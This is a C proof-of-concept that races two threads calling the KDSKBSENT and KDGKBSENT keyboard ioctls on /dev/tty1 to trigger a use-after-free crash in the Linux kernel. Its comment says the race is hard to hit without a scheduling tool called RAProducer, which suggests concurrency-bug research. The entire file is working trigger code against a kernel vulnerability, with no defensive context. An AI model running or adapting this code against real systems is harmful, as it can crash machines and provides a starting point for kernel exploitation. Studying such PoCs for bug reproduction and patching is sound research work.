// With the proper scheduling, this data-race PoC may trigger a UAF crash.
// However, without the help of RAProducer, it could run in a loop for two days without crashing.
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#define KDGKBSENT 0x4B48 /* gets one function key string entry */
#define KDSKBSENT 0x4B49 /* sets one function key string entry */

struct kbsentry {
unsigned char kb_func;
unsigned char kb_string[512];
};
int fd;
void *race1()
{    
    struct kbsentry *kbs;  
    void *addr = malloc(0x100);    
    kbs = malloc(sizeof(struct kbsentry));
    kbs->kb_func = 0;    
    strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    ioctl(fd,KDSKBSENT,kbs);    
    ioctl(fd,KDGKBSENT,addr);
   
}    
void *race2()
{    
    struct kbsentry *kbs;
    kbs = malloc(sizeof(struct kbsentry));
    kbs->kb_func = 0;
    strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");    
    ioctl(fd,KDSKBSENT,kbs);
}  
int main(int argc, char** argv)
{
    void *status;
    pthread_t th1,th2;
    fd = open("/dev/tty1", O_RDONLY, 0);
    pthread_create(&th1, NULL, race1, NULL);
    pthread_create(&th2, NULL, race2, NULL);
    pthread_join(th1, &status);
    pthread_join(th2, &status);

}
